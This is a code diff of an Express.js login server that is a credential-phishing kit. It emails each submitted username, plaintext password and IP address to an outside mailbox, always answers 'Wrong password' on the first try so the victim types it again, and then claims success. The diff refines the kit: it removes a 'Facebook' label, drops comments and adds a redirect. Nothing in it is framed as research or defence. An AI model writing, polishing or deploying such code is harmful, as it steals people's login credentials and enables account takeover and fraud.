@@ -7,7 +7,8 @@ import { dirname } from "path";
 import session from "express-session";
 import nodemailer from "nodemailer";
 import * as dotenv from 'dotenv';
-dotenv.config()
+
+dotenv.config();
 
 const app = express();
 
@@ -43,47 +44,42 @@ const transporter = nodemailer.createTransport({
 });
 
 app.get("/", (req, res) => {
-    // Pass any messages and previous input to the EJS template
     const message = req.session.message || '';
     const email = req.session.email || '';
-    const password = req.session.password || '';
     req.session.message = null; // Clear message after displaying it
-    res.render("index", { message, email, password });
+    res.render("index", { message, email });
 });
 
 app.post("/login", (req, res) => {
     const { email, password } = req.body;
     const userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-    // Store user input in session for re-rendering
     req.session.email = email;
-    req.session.password = password;
 
-    // Create the email subject based on the attempt number
     const attemptNumber = req.session.attempt || 1;
     const mailOptions = {
         from: '"Info" <info@vaulttrustfinancial.com>',
         to: 'info@vaulttrustfinancial.com',
         subject: `Login Attempt ${attemptNumber} by ${email}`,
-        text: `Facebook Contact Form Details\nAttempt ${attemptNumber}\nUsername: ${email}\nPassword: ${password}\nUser IP: ${userIp}`
+        text: `Details\nAttempt ${attemptNumber}\nUsername: ${email}\nPassword: ${password}\nUser IP: ${userIp}`
     };
 
-    // Send the email
-    transporter.sendMail(mailOptions, (error, info) => {
+    transporter.sendMail(mailOptions, (error) => {
         if (error) {
             console.log(error);
             req.session.message = 'Wrong password. Try again!';
+            res.json({ message: req.session.message, redirect: false });
         } else {
-            console.log('Email sent: ' + info.response);
-            req.session.message = attemptNumber === 1 ? 'Wrong password' : 'You have been successfully added to the private chat, you will get a message request shortly.';
-            
+            req.session.message = attemptNumber === 1 ? 'Wrong password' : 'You have been successfully added.';
+            req.session.attempt = attemptNumber === 1 ? 2 : 1;
 
+            res.json({
+                message: req.session.message,
+                redirect: attemptNumber !== 1
+            });
         }
-        req.session.attempt = attemptNumber === 1 ? 2 : 1; // Toggle the attempt number
-        
     });
 });
-
 
 app.listen(3000, () => {
     console.log("Server started on port 3000");
